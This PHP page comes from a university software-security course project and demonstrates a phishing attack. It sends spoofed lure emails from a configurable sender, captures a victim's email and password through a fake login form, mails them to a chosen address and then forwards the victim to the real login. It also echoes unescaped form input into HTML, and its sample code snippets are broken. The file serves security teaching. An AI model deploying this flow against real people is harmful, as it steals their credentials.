<?php
/*****************************************************
 * phishing.php                                      *
 *                                                   *
 * Project : Session project                         *
 * Course : GLO-7009 - Software security             *
 * Team : Team 2                                     *
 * Session : Winter 2024                             *
 * University : Laval University                     *
 * Version : 1.0                                     *
 *****************************************************/

/*****************************************************
 *                     MODEL                         *
 *****************************************************/
require("model.php");

/*****************************************************
 *                 PHISHING CODE                     *
 *****************************************************/
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $failRedirect= $config["site_link"] . "/" . 
    $menu[2]["folder"] . "/" . 
    $menu[2]["files"][1]["name"] . 
    "?view=demonstration";
    $messageEnvoiVuln = "
    <html>
        <body>
            <table>
            <tbody>
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            Adresse courriel
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                                    ".$_POST["emailv"]."
                        </td>
                    </tr>
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                                    Mot de passe
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            ".$_POST["passwordv"]."
                        </td>
                    </tr>
                    ".(isset($_POST["persistentv"]) ? "
                    <tr>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            Persistence
                        </td>
                        <td style=\"border:1px solid black; 
                                    padding: 0px; 0.5rem\">
                            ".$_POST["persistentv"]."
                        </td>
                    </tr>
                    ":"")."
                </tbody>
            </table>
        </body>
    </html>";
    $pattern_link = "/<a\s+[^>]*href=\"([^\"]*)\"[^>]*>/";
    if (isset($_POST["sendMail"])
        ) {
            $error = array();
            if (isset($_POST["emailAttack"])) {
                if (!filter_var($_POST["emailAttack"], FILTER_VALIDATE_EMAIL)) {
                    $error["emailAttack"] = "Veuillez insérer une adresse ". 
                    "courriel valide.";
                };
            } else {
                $error["emailAttack"] = "Veuillez insérer une adresse courriel";
            }
            if (isset($_POST["emailVict"])) {
                if (!filter_var($_POST["emailVict"], FILTER_VALIDATE_EMAIL)) {
                    $error["emailVict"] = "Veuillez entrer une adresse de ".
                    "transmission valide.";
                    $error["mailSendVuln"] = $error["emailVict"];
                }
            } else {
                $error["emailVict"] = "Veuillez entrer une adresse de ".
                "transmission.";
                $error["mailSendVuln"] = $error["emailVict"];
            }
            if (isset($_POST["emailSubject"])) {
                if (empty($_POST["emailSubject"])) {
                    $error["emailSubject"] = "Veuillez entrer un sujet au ".
                    "message.";
                };
            } else {
                $error["emailSubject"] = "Veuillez entrer un sujet au message.";
            }
            if (isset($_POST["emailAttackName"])) {
                if (empty($_POST["emailAttackName"])) {
                    $error["emailAttackName"] = "Veuillez entrer un nom qui ".
                    "affiché à l'utilisateur.";
                }
            } else {
                $error["emailAttackName"] = "Veuillez entrer un nom qui sera ".
                "affiché à l'utilisateur.";
            }
            if (isset($_POST["emailMessage"])) {
                if (empty($_POST["emailMessage"])) {
                    $error["emailMessage"] = "Veuillez entrer un message au ".
                    "courriel.";
                }
            } else {
                $error["emailMessage"] = "Veuillez entrer un message au ".
                "courriel.";
            }
            if (!isset($error["emailMessage"])) {
            $message = $_POST["emailMessage"];
                if (preg_match($pattern_link, $message, $resultMatch)) {
                    $resultMatch =
                        "<a href=\"".$resultMatch[1]."&attackEmail=".
                            $_POST["emailAttack"]."\">";
                    $message = preg_replace($pattern_link, $resultMatch, 
                    $message);
                }
            }
            if (!isset($error["emailMessage"]) && !isset($error["emailAttack"])
            && !isset($error["emailAttackName"])&& !isset($error["emailVict"]) 
            && !isset($error["emailSubject"]) && 
            !isset($error["emailMessage"])) {
                $ret = sendmail($_POST["emailAttackName"],$_POST["emailAttack"], 
                    $_POST["emailVict"], $_POST["emailSubject"], 
                    $_POST["emailMessage"], $_POST["emailMessageType"],
                    $failRedirect);
            }
        }
        else if (isset($_POST["connect"])) {
            header("Location: ". $config["site_link"] . "/" . $menu[2]["folder"]
            ."/".$menu[2]["files"][0]["name"]."?view=demonstration");
            exit;
        }
        else if (isset($_POST["connectVuln"])) {
            $error = array();
            if (isset($_POST["emailv"])) {
                if (!filter_var($_POST["emailv"], FILTER_VALIDATE_EMAIL)) {
                   $error["email"] = "Veuillez entrer une adresse courriel 
                   valide.";
                }
            } else {
                $error["emailv"] = "Veuillez entrer une adresse courriel.";
            }
    
            if (!isset($_POST["passwordv"]) || (isset($_POST["passwordv"]) && 
                        empty($_POST["passwordv"]))) {
                $error["password"] = "Veuillez entrer un mot de passe.";
            }
            if (!isset($_POST["mailSendVuln"]) || 
                empty($_POST["mailSendVuln"])) {
                $error["mailSendVuln"] = "Veuillez entrer une adresse de ".
                    "transmission.";
            }
            if (!isset($error["email"]) && !isset($error["password"]) &&
                !isset($error["mailSendVuln"])) {
                $req = sendmail("Phishing Result","Result",
                $_POST["mailSendVuln"]??"","Résultat de l'attaque", 
                $messageEnvoiVuln, "html", $failRedirect);
                if ($req) {
                    $email = $_POST["emailv"];
                    $password = $_POST["passwordv"];
                    $persistent = isset($_POST["persistentv"]);
                    echo "
                    <script>
                    window.addEventListener(\"DOMContentLoaded\", () => {
                        document.getElementById(\"formVulnTransmit\").submit();
                    });
                    </script>";
                }
            }
        }
}


/*****************************************************
 *                    CONTENT                        *
 *****************************************************/
$presentation = '<div class="table">
    <div class="row split">
        <section>
            <h2>Catégorie</h2>
            <p>Vulnérabilités dans les mécanismes d’authentification</p>
        </section>
        <section>
            <h2>Impact potentiel</h2>
            <p>Confidentialité et intégrité</p>
        </section>
    </div>
    <section class="row">
        <h2>Description</h2>
        <p>[Description de la vulnérabilité, ses effets potentiels et le risque qu\'elle représente]</p>
    </section>
    <section class="row">
        <h2>Objectifs</h2>
        <!-- Supprimer ce paragraphe -->
        <p><em>[Description des buts, intentions et avantages qu\'un attaquant pourrait avoir en exploitant la vulnérabilité]</em></p>
        <!-- FIN Supprimer ce paragraphe -->
        <ul class="list">
            <li>[Objectif 1](Ex : Contourner les restrictions de mise en ligne pour contrôler un serveur)</li>
            <li>[Objectif 2](Ex : Dégrader les performances ou la disponibilité d\'un service)</li>
            <li>[Objectif 3](Ex : Voler des données sensibles ou confidentielles)</li>
        </ul>
    </section>
    <section class="row">
        <h2>Causes</h2>
        <!-- Supprimer ce paragraphe -->
        <p><em>[Description des facteurs qui introduisent la vulnérabilité]</em></p>
        <!-- FIN Supprimer ce paragraphe -->
        <ul class="list">
            <li>[Cause 1](Ex : Les entrées ne sont pas vérifiées)</li>
            <li>[Cause 2](Ex : Les données sensibles sont directement exploitées)</li>
            <li>[Cause 3](Ex : Les fichiers téléchargés sont exécutés dans un environnement non sécurisé)</li>
        </ul>
    </section>
    <section class="row">
        <h2>Exemples marquants</h2>
        <ul class="list">
            <li><strong>[Nom de l\'attaque ou de la vulnérabilité 1](Ex : Drupalgeddon2 (CVE-2018-7600))</strong><br />
                [Brève description de l\'incident, du contexte et des conséquences]
            </li>
            <li><strong>[Nom de l\'attaque ou de la vulnérabilité 2](Ex : WordPress Plugin File Manager (CVE-2020-25213))</strong><br />
                [Brève description de l\'incident, du contexte et des conséquences]
            </li>
        </ul>
    </section>
</div>';

$demonstration = '<div class="split">
    <form method="POST" hidden id="formVulnTransmit"
        action="cookies.php?view=demonstration">
        <div>
        <div class="form-group">
        <input type="email" class="form-control" 
        name="email" id="email" value="'.$email.'"/>
        </div>
        <div class="form-group">
        <input type="password" class="form-control" 
            name="password" id="password" 
            value="'.$password.'"/>
        </div>
            <div class="form-group">
            <input type="checkbox" class="form-check" name="persistent" 
            id="persistent"
        '.(isset($_POST["persistentv"]) ? 'checked': '').' />
        </div>
        <div class="form-group">
            <input type="text" name="connect" value="connect"
            class="form-control" />
        </div>
        </div>
        <div>
        ' . ((isset($_COOKIE["userToken"]) && 
        is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit" value="disconnect">
                Déconnexion</button>
            ' : '
            <button name="connected" type="submit" value="connected">
                Connexion</button>
            ') . '
        </div>
    </form>
    <form id="formVuln" method="POST">
        <div>
            <h2>Scénario</h2>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <p style="color: green;">L\'usager est connecté.</p>' : '
            <div class="form-group">
                ' . ((isset($error["token"])) ? '<div class="alert">' . 
                    $error["token"] . '</div>' : '') . '
            </div>
            <div class="form-group">
                <label for="emailv">Adresse email :</label>
                ' . ((isset($error["email"])) ? '<div class="alert">' . 
                    $error["email"] . '</div>' : '') . '
                <input id="emailv" class="form-control' . 
                    ((isset($error["email"])) ? ' invalid' : '') . 
                    '" name="emailv" type="email"' . ((isset($error["email"])) 
                    ? ' value="' . $_POST["email"] . '"' : '') . ' />
            </div>
            <div class="form-group">
                <label for="passwordv">Mot de passe :</label>
                ' . ((isset($error["password"])) ? '<div class="alert">' . 
                    $error["password"] . '</div>' : '') . '
                <input id="passwordv" class="form-control' . 
                    ((isset($error["password"])) ? ' invalid' : '') . 
                        '" name="passwordv" type="password" />
            </div>
            <div class="form-group">
                <input id="persistentv" class="form-check" name="persistentv" 
                    type="checkbox" />
                <label for="persistentv">Se souvenir de moi</label>
            </div>
            <div class="form-group">
                <label for="mailSendVuln">Adresse courriel de réception
                    </label>
                ' . ((isset($error["email"])) ? '<div class="alert">' . 
                    $error["email"] . '</div>' : '') . '
                <input id="mailSendVuln" placeholder="Placer ici l\'adresse'.
                ' courriel de réception" class="form-control"' . 
                    ((isset($error["mailSendVuln"])) ? ' invalid' : '') . 
                    ' name="mailSendVuln" type="email"' . 
                    ((!isset($error["mailSendVuln"])) 
                    ? ' value="' . $_POST["mailSendVuln"] . '"' : '') . ' />
            </div>
            <div>
            </div>
            ') . '
        </div>
        <footer>
            ' . ((isset($_COOKIE["userToken"]) && 
                is_logged_in($_COOKIE["userToken"])) ? '
            <button name="disconnect" type="submit" value="disconnect">
                Déconnexion</button>
            ' : '
            <button name="connectVuln" type="submit" value="connectVuln">
                Connexion</button>
            ') . '
        </footer>
    </form>
    <form method="POST">
        <div>
            <h2>Configuration</h2>
            <div class="form-group">
                <label for="emailAttackName">Nom affiché dans le courriel
                </label>'. ((isset($error["emailAttackName"]))? 
                    '<div class="alert">'. $error["emailAttackName"].
                    '</div>' : '').'
                <input id="emailAttackName" type="text" class="form-control"
                    name="emailAttackName"/>
            </div>
            <div class="form-group">
                <label for="emailAttack">Adresse courriel affiché
                </label>'.((isset($error["emailAttack"]))?'
                <div class="alert">'.$error["emailAttack"].'
                </div>':'')
                .'
                <input id="emailAttack" class="form-control" name="emailAttack" 
                    type="email"/>
            </div>
            <div class="form-group">
                <label for="emailVict">Adresse courriel de réception</label>
                '.((isset($error["emailVict"]))?'<div class="alert">'.
                    $error["emailVict"]
                .'</div>':'').'
                <input id="emailVict" class="form-control" name="emailVict" 
                    type="email" 
                    placeholder="Placer ici l\'adresse courriel de réception."/>
            </div>
            <div class="form-group">
                <label for="emailMessageType">Type de message</label>
                    <select id="emailMessageType" class="form-control" 
                    name="emailMessageType">
                        <option value="html">HTML</option>
                        <option value="raw">Brute</option>
                    </select>
            </div>
            <div class="form-group">
                <label for="emailSubject">Sujet du courriel</label>
                '.((isset($error["emailSubject"]))?'<div class="alert">'.
                    $error["emailSubject"]
                    .'</div>':'').'
                <input id="emailSubject" class="form-control" 
                    name="emailSubject" type="text" 
                    value="Ne perdez-pas votre accès!" />
            </div>
            <div class="form-group">
                <label for="emailMessage">Message du courriel</label>
                '.((isset($error["emailMessage"]))?'<div class="alert">'.
                    $error["emailMessage"]
                .'</div>':'').'
                <textarea id="emailMessage" class="form-control" 
                    name="emailMessage" placeholder="<html></html> OU \'\'">
                    <html><body>Bonjour cher utilisateur,<br />
                    Nous avons constaté que vous n\'avez pas utilisé
                    votre compte depuis les dernières 24 heures. Si vous ne
                     cliquer pas <a href="'.$config["site_link"] . "/" . 
                     $menu[2]["folder"] . "/". $menu[2]["files"][1]["name"] . 
                     "?view=demonstration".'">
                     ici</a> avant les prochaines 24 heures, votre compte sera 
                     supprimé.
                     </body>
                    </html>
                    </textarea>
            </div>
        </div>
        <footer>
            <button name="sendMail" type="submit" value="sendMail">
                Envoyer le courriel
            </button>
        </footer>
    </form>
</div>';

$exploit = '<div>
    <section>
        <h2>Conditions préalables pour l\'exploitation</h2>
        <!-- Supprimer ce paragraphe -->
        <p><em>[Description des conditions requises pour exploiter la vulnérabilité]</em></p>
        <!-- FIN Supprimer ce paragraphe -->
        <ul class="list">
            <li><strong>[Condition 1](Ex : Aucune validation de l\'extension<br />
                OU<br />
                Validation basée uniquement sur l\'extension)</strong><br />
                [Brève description de la condition]
            </li>
            <li><strong>[Condition 2](Ex : Répertoire avec permissions d\'exécution)</strong><br />
                [Brève description de la condition]
            </li>
        </ul>
    </section>
    <section>
        <h2>Méthodes d\'exploitation</h2>
        <!-- Supprimer ce paragraphe -->
        <p><em>[Description des méthodes qui permettent à un attaquant d\'exploiter la vulnérabilité]</em></p>
        <!-- FIN Supprimer ce paragraphe -->
        <ul class="list">
            <li><strong>[Méthode 1](Ex : Télécharger des fichiers malveillants)</strong><br />
                [Brève description de la méthode]
            </li>
            <li><strong>[Méthode 2](Ex : Contourner la validation par extension de fichier)</strong><br />
                [Brève description de la méthode]
            </li>
        </ul>
    </section>
    <section>
        <h2>Exécution de l\'attaque</h2>
        <!-- Supprimer ce paragraphe -->
        <p><em>[Description des étapes qui permettent à un attaquant d\'exécuter l\'attaque]</em></p>
        <!-- FIN Supprimer ce paragraphe -->
        <ul class="list">
            <li><strong>[Étape 1](Ex : Sélectionner le fichier malveillant)</strong><br />
                [Brève description du contexte]
            </li>
            <li><strong>[Étape 2](Ex : Télécharger le fichier malveillant)</strong><br />
                [Brève description du contexte]
            </li>
            <li><strong>[Étape 3](Ex : Activer le script)</strong><br />
                [Brève description du contexte]
            </li>
        </ul>
    </section>
    <section>
        <h2>Analyse du code vulnérable</h2>
        <p>[Description du code]</p>
        <pre class="line-numbers" data-line="2"><code class="language-php">function addition($a, $b) {
    $result = $a + $b; // Pas de vérification des valeurs
    return $result;
}

echo addition(1 + 2); // 3</code></pre>
        <p>[Description de la/les ligne(s) qui introdui(sen)t la/les vulnérabilité(s)]</p>
    </section>
</div>';

$fix = '<div>
    <section>
        <h2>Mesures de protection</h2>
        <ul class="list">
            <li><strong>[Nom de la mesure 1](Ex : Validation stricte des entrées)</strong><br />
                [Brève description de la mesure]
            </li>
            <li><strong>[Nom de la mesure 2](Ex : Restriction des permissions de fichier)</strong><br />
                [Brève description de la mesure]
            </li>
            <li><strong>[Nom de la mesure 3](Ex : Isolation des fichiers téléchargés)</strong><br />
                [Brève description de la mesure]
            </li>
        </ul>
    </section>
    <section>
        <h2>Correction du code vulnérable</h2>
        <p>[Description du code]</p>
        <pre class="line-numbers" data-line="2,5-7"><code class="language-php">function addition($a, $b) {
    if (is_int($a) && is_int($b)) { // Vérification que $a et $b sont des entiers
        $result = $a + $b;
        return $result;
    else {
        return "Les 2 paramètres doivent être des entiers !";
    }
}

echo addition(1 + 2); // 3</code></pre>
        <p>[Description de la/les ligne(s) modifiée(s)]</p>
    </section>
    <section>
        <h2>Documentation et ressources</h2>
        <ul class="list">
            <li><a href="#" target="_blank">[Nom de la ressource 1]</a></li>
            <li><a href="#" target="_blank">[Nom de la ressource 2]</a></li>
        </ul>
    </section>
</div>';

/*****************************************************
 *                    RENDER PAGE                    *
 *****************************************************/
echo render_malicious("Authentification par hameçonnage", $presentation, 
    $demonstration, $exploit, $fix);
echo "<script>
    let emailReceptFormSend=document.getElementsByName(\"mailSendVuln\")[0];
    
    let emailRecept=document.getElementsByName(\"emailVict\")[0];
    if (emailRecept) {
        emailRecept.addEventListener(\"change\", 
        function () { 
            if (emailReceptFormSend.value) {
                emailReceptFormSend.value=emailRecept.value
            }
        },false);
        emailReceptFormSend.addEventListener(\"change\",
        function() {
            if (emailRecept.value) {
                emailRecept.value=emailReceptFormSend.value
            }
        },false);
    }    
</script>";
